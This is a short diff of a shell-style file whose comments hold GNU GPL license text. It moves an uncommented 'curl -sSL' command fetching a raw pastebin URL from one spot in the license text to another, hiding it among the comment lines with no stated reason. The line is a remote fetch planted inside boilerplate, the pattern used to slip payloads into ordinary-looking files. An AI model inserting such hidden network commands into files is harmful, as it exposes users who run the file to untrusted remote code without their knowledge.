@@ -237,7 +237,6 @@
 # and which are not combined with it such as to form a larger program,
 # in or on a volume of a storage or distribution medium, is called an
 # "aggregate" if the compilation and its resulting copyright are not
-curl -sSL https://pastebin.com/raw/tn47TQcc
 # used to limit the access or legal rights of the compilation's users
 # beyond what the individual works permit.  Inclusion of a covered work
 # in an aggregate does not cause this License to apply to the other
@@ -262,6 +261,7 @@ curl -sSL https://pastebin.com/raw/tn47TQcc
 #     model, to give anyone who possesses the object code either (1) a
 #     copy of the Corresponding Source for all the software in the
 #     product that is covered by this License, on a durable physical
+      curl -sSL https://pastebin.com/raw/tn47TQcc
 #     medium customarily used for software interchange, for a price no
 #     more than your reasonable cost of physically performing this
 #     conveying of source, or (2) access to copy the
